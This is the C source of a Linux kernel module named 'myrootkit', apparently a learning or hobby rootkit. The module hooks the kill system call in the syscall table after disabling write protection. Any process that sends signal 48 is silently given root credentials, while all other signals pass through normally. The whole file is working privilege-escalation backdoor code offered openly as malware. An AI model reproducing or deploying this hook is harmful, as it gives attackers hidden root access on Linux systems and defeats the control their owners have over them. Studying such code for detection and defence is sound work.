/**
Author: Mote
File: myrootkit.c
**/
#include <linux/module.h>    
#include <linux/kernel.h>   
#include <linux/init.h>
//dirent
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
//copy_from_user
#include <linux/uaccess.h>
//version
#include <linux/version.h>
#include "motekit/motekit.h"
//#include "zeroevil/zeroevil.h"


MODULE_LICENSE("GPL");



//========== HOOK HELPER =================

unsigned long **sct;

asmlinkage int fake_kill(pid_t pid, int sig);
asmlinkage int (*real_kill)(pid_t pid, int sig);

#define SIGROOT 48
asmlinkage int fake_kill(pid_t pid, int sig){
    switch(sig){
        case SIGROOT:
            commit_creds(prepare_kernel_cred(0));
            break;
	default:
            return real_kill(pid,sig);

    }
    return 0;
}

//========== END HOOK HELPER =================

int
hook_start(void)
{
	/* No consideration on failure. */
	sct = get_sct();
	printk("sys_call_table_addr: %p\n",sct);
	disable_wp();
	HOOK_SCT(sct, kill);
	enable_wp();
	pr_info("%s\n", "Hook Start!");
	return 0;
}


void
hook_stop(void)
{
	disable_wp();
	UNHOOK_SCT(sct, kill);
	enable_wp();
	pr_info("%s\n", "Hook Stop!");
	return;
}


//Module init and exit
static int __init myrootkit_init(void)
{
	hook_start();
	return 0;
}

static void __exit myrootkit_exit(void)
{
	hook_stop();	
}



module_init(myrootkit_init);
module_exit(myrootkit_exit);

